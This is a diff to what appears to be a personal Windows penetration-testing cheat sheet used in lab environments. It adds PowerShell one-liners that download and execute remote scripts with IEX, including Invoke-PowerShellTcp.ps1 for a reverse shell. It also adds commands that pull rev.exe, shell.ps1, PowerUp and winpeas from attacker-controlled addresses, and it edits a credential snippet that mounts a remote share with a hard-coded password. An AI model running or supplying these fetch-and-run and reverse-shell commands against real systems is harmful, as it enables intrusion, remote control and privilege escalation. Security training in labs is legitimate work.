@@ -66,16 +66,18 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 ## Powershell
 ```powershell
 # Download and execute files
-Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.19/shell.ps1')"
+Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7/poc.ps1')"
 
-IEX(New-Object Net.WebClient).downloadString('http://10.10.16.19/PowerUp.ps1')
-
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5/inv.ps1')
+IEX(IWR http://10.10.14.10:9999/ Invoke-PowerShellTcp.ps1 -UseBasecParsing)
 # download files
 IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/PowerUp.ps1','powerup.ps1')
 Invoke-WebRequest -Uri 10.10.16.4/winpeas.bat -OutFile winpeas.bat
 
-IWR -Uri http://10.10.16.19/wlbsctrl.dll -OutFile wlbsctrl.dll
-
+IWR -Uri http://10.10.16.19/rev.exe -OutFile rev.exe
+IWR -Uri http://10.10.16.7/rev.exe -OutFile rev.exe
+Invoke-WebRequest -Uri 10.10.16.7/shell.ps1 -OutFile shell.ps1
+Invoke-WebRequest -Uri 10.10.16.7/test.ps1 -OutFile test.ps1
 ````
 
 
@@ -95,7 +97,7 @@ certutil -urlcache -f http://IP/FILE OUTPUTFILENAME
 
 
 $pass = convertto-securestring '1234' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential ('alfred', $SecPass)
+$cred = New-Object System.Management.Automation.PSCredential ('alfred', $pass)
 New-PSDrive -Name super -PSProvider FileSystem -Credential 
 $cred -Root \\10.10.17.185\super
 
